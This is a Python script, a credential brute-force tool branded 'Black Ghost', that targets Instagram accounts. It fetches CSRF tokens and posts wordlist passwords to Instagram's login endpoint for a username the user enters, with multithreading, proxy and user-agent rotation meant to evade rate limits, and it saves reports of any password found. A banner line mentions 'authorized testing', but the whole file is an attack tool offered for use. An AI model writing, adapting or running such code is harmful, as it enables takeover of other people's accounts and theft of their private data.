import requests
import json
import time
import os
import random
import sys
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin

def welcome_message():
    logo = '''
      ██████╗ ██╗      ██████╗ ███████╗███████╗
     ██╔══██╗██║     ██╔══██╗██╔════╝██╔════╝
     ██████╔╝██║     ██████╔╝█████╗  █████╗  
     ██╔═══╝ ██║     ██╔══██╗██╔══╝  ██╔══╝  
     ██║     ███████╗██████╔╝███████╗███████╗
     ╚═╝     ╚══════╝╚═════╝ ╚══════╝╚══════╝
    Black Ghost Instagram Brute Force Tool v1.0
    '''
    print(f"\033[1;31m{logo}\033[0m")
    print("\033[1;32m[*] Welcome to Instagram Account Cracker!\033[0m")
    print("\033[1;33m[!] Use this tool only for authorized testing\033[0m\n")

def display_sticker(message):
    stickers = {
        "username": "🧑‍💻",
        "password": "🔑",
        "proxy": "🌍",
        "delay": "⏱️",
        "multithreading": "💻",
        "user-agent": "🕵️‍♂️",
        "save-results": "💾",
        "proxy-rotation": "🔄",
        "threads": "⚙️",
        "start": "▶️"
    }
    return f"{stickers.get(message, '❓')} {message}"

class InstagramBruter:
    def __init__(self, target_username, wordlist='pas.txt', proxy=None, delay=2):
        self.target_username = target_username
        self.wordlist_file = wordlist
        self.proxy_address = proxy
        self.request_delay = delay
        self.session = requests.Session()
        self.csrf_token = None
        self.login_endpoint = 'https://www.instagram.com/accounts/login/ajax/'
        self.instagram_home = 'https://www.instagram.com/'
        self.successful_password = None
        self.attempt_count = 0
        self.success_count = 0
        self.failed_count = 0
        self.passwords_list = []
        self.user_agents_list = []
        self.proxies_list = []
        
        self.setup_headers()
        self.load_wordlist()
        self.setup_user_agents()

    def setup_headers(self):
        base_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Referer': self.instagram_home,
            'X-Requested-With': 'XMLHttpRequest',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        self.session.headers.update(base_headers)
        
        if self.proxy_address:
            proxy_dict = {
                'http': self.proxy_address,
                'https': self.proxy_address
            }
            self.session.proxies.update(proxy_dict)
            print(f"[*] Proxy set to: {self.proxy_address}")

    def load_wordlist(self):
        if not os.path.exists(self.wordlist_file):
            print(f"\033[1;31m[!] Wordlist file '{self.wordlist_file}' not found!\033[0m")
            sys.exit(1)
        
        try:
            with open(self.wordlist_file, 'r', encoding='utf-8') as f:
                self.passwords_list = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"\033[1;31m[!] Error reading wordlist: {e}\033[0m")
            sys.exit(1)
        
        if not self.passwords_list:
            print(f"\033[1;31m[!] Wordlist is empty!\033[0m")
            sys.exit(1)
        
        print(f"\033[1;32m[+] Loaded {len(self.passwords_list)} passwords from '{self.wordlist_file}'\033[0m")

    def setup_user_agents(self):
        self.user_agents_list = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.34',
            'Mozilla/5.0 (Android 9; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0'
        ]

    def get_csrf_token(self):
        try:
            response = self.session.get(self.instagram_home, timeout=10)
            cookies_dict = response.cookies.get_dict()
            csrf = cookies_dict.get('csrftoken')
            
            if csrf:
                self.csrf_token = csrf
                return csrf
            else:
                print("\033[1;31m[!] Failed to fetch CSRF token\033[0m")
                return None
        except Exception as e:
            print(f"\033[1;31m[!] Error getting CSRF token: {e}\033[0m")
            return None

    def attempt_login(self, password):
        if not self.csrf_token:
            self.csrf_token = self.get_csrf_token()
            if not self.csrf_token:
                print("\033[1;31m[!] Cannot proceed without CSRF token\033[0m")
                return False

        login_headers = {
            'X-CSRFToken': self.csrf_token,
            'Referer': f'{self.instagram_home}accounts/login/',
            'X-Instagram-AJAX': '1',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.session.headers.update(login_headers)

        login_payload = {
            'username': self.target_username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }

        try:
            response = self.session.post(
                self.login_endpoint,
                data=login_payload,
                timeout=15,
                allow_redirects=True
            )
            
            self.csrf_token = response.cookies.get('csrftoken', self.csrf_token)
            self.attempt_count += 1

        except requests.exceptions.RequestException as e:
            print(f"\033[1;31m[!] Request error: {e}\033[0m")
            return False

        try:
            response_data = response.json()
        except json.JSONDecodeError:
            print("\033[1;31m[!] Invalid JSON response from server\033[0m")
            return False

        if response_data.get('authenticated'):
            self.successful_password = password
            self.success_count += 1
            print(f"\033[1;32m[+] SUCCESS! Password found: {password}\033[0m")
            return True
        elif response_data.get('message') == 'checkpoint_required':
            print(f"\033[1;33m[!] Checkpoint triggered (2FA/Suspicious): {password}\033[0m")
            self.success_count += 1
            return True
        else:
            self.failed_count += 1
            print(f"\033[1;31m[-] Failed attempt #{self.attempt_count}: {password}\033[0m")
            return False

    def start_brute_force(self, use_multithreading=False, num_threads=5):
        print(f"\033[1;32m[*] Starting brute force attack on: {self.target_username}\033[0m")
        print(f"\033[1;32m[*] Total passwords to try: {len(self.passwords_list)}\033[0m\n")

        if use_multithreading:
            self.brute_force_multithreaded(num_threads)
        else:
            self.brute_force_sequential()

        self.print_statistics()

    def brute_force_sequential(self):
        for index, password in enumerate(self.passwords_list, 1):
            try:
                print(f"\033[1;36m[*] Attempt {index}/{len(self.passwords_list)}\033[0m", end=' ')
                
                if self.attempt_login(password):
                    print(f"\033[1;32m[+] Attack successful!\033[0m")
                    break
                
                time.sleep(self.request_delay)
                
            except KeyboardInterrupt:
                print("\n\033[1;31m[!] Attack interrupted by user\033[0m")
                break

    def brute_force_multithreaded(self, num_threads):
        print(f"\033[1;33m[*] Using {num_threads} threads for attack\033[0m\n")
        
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(self.attempt_login, pwd) for pwd in self.passwords_list]
            
            for future in futures:
                try:
                    if future.result():
                        break
                except Exception as e:
                    print(f"\033[1;31m[!] Thread error: {e}\033[0m")

    def print_statistics(self):
        print(f"\n\033[1;36m{'='*50}\033[0m")
        print(f"\033[1;32m[+] Attack Statistics:\033[0m")
        print(f"\033[1;32m[+] Total Attempts: {self.attempt_count}\033[0m")
        print(f"\033[1;32m[+] Successful: {self.success_count}\033[0m")
        print(f"\033[1;31m[-] Failed: {self.failed_count}\033[0m")
        if self.successful_password:
            print(f"\033[1;32m[+] Found Password: {self.successful_password}\033[0m")
        print(f"\033[1;36m{'='*50}\033[0m\n")

    def save_results(self, filename='brute_results.txt'):
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"Instagram Brute Force Results\n")
                f.write(f"{'='*40}\n")
                f.write(f"Target Username: {self.target_username}\n")
                f.write(f"Total Attempts: {self.attempt_count}\n")
                f.write(f"Successful: {self.success_count}\n")
                f.write(f"Failed: {self.failed_count}\n")
                if self.successful_password:
                    f.write(f"Found Password: {self.successful_password}\n")
                f.write(f"{'='*40}\n")
            print(f"\033[1;32m[+] Results saved to {filename}\033[0m")
        except Exception as e:
            print(f"\033[1;31m[!] Error saving results: {e}\033[0m")

    def load_proxy_list(self, filename='proxy_list.txt'):
        if not os.path.exists(filename):
            print(f"\033[1;31m[!] Proxy list file '{filename}' not found\033[0m")
            return []
        
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                self.proxies_list = [line.strip() for line in f if line.strip()]
            print(f"\033[1;32m[+] Loaded {len(self.proxies_list)} proxies\033[0m")
            return self.proxies_list
        except Exception as e:
            print(f"\033[1;31m[!] Error loading proxies: {e}\033[0m")
            return []

    def rotate_proxies(self):
        if not self.proxies_list:
            print("\033[1;31m[!] No proxies available for rotation\033[0m")
            return
        
        print(f"\033[1;33m[*] Starting proxy rotation attack\033[0m")
        for proxy in self.proxies_list:
            self.proxy_address = proxy
            self.session.proxies.update({
                'http': proxy,
                'https': proxy
            })
            print(f"\033[1;33m[*] Using proxy: {proxy}\033[0m")
            
            for password in self.passwords_list:
                if self.attempt_login(password):
                    break
                time.sleep(self.request_delay)

    def random_user_agent_rotation(self, enable=True):
        if enable:
            print(f"\033[1;32m[*] Random User-Agent rotation enabled\033[0m")
            for _ in range(len(self.passwords_list)):
                random_ua = random.choice(self.user_agents_list)
                self.session.headers['User-Agent'] = random_ua

    def generate_report(self, filename='attack_report.html'):
        html_content = f"""
        <html>
        <head>
            <title>Instagram Brute Force Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; }}
                .header {{ background-color: #333; color: white; padding: 20px; }}
                .stats {{ margin: 20px; }}
                .success {{ color: green; }}
                .failed {{ color: red; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Instagram Brute Force Attack Report</h1>
            </div>
            <div class="stats">
                <h2>Statistics:</h2>
                <p>Target: {self.target_username}</p>
                <p>Total Attempts: {self.attempt_count}</p>
                <p class="success">Successful: {self.success_count}</p>
                <p class="failed">Failed: {self.failed_count}</p>
                <p>Password Found: {self.successful_password if self.successful_password else 'Not found'}</p>
            </div>
        </body>
        </html>
        """
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(html_content)
            print(f"\033[1;32m[+] Report generated: {filename}\033[0m")
        except Exception as e:
            print(f"\033[1;31m[!] Error generating report: {e}\033[0m")

if __name__ == '__main__':
    welcome_message()

    target = input(f"{display_sticker('username')} Enter target Instagram username: ").strip()
    if not target:
        print("\033[1;31m[!] Username cannot be empty!\033[0m")
        sys.exit(1)

    use_proxy = input(f"{display_sticker('proxy')} Use proxy? (y/n): ").strip().lower() == 'y'
    proxy = None
    if use_proxy:
        proxy = input(f"{display_sticker('proxy')} Enter proxy (http://ip:port): ").strip()

    delay = input(f"{display_sticker('delay')} Enter delay between attempts (seconds): ").strip()
    try:
        delay = int(delay)
    except ValueError:
        delay = 2

    use_multithreading = input(f"{display_sticker('multithreading')} Use multithreading? (y/n): ").strip().lower() == 'y'
    threads = 5
    if use_multithreading:
        threads = input(f"{display_sticker('threads')} Number of threads (default 5): ").strip()
        try:
            threads = int(threads)
        except ValueError:
            threads = 5

    use_random_ua = input(f"{display_sticker('user-agent')} Randomize User-Agent? (y/n): ").strip().lower() == 'y'

    use_proxy_rotation = input(f"{display_sticker('proxy-rotation')} Use proxy rotation? (y/n): ").strip().lower() == 'y'

    save_result = input(f"{display_sticker('save-results')} Save results? (y/n): ").strip().lower() == 'y'

    bruter = InstagramBruter(target, proxy=proxy, delay=delay)
    
    if use_proxy_rotation:
        bruter.load_proxy_list()

    if use_random_ua:
        bruter.random_user_agent_rotation()

    bruter.start_brute_force(use_multithreading=use_multithreading, num_threads=threads)

    if save_result:
        bruter.save_results()
        bruter.generate_report()

    print(f"\033[1;32m[*] Attack completed!\033[0m")
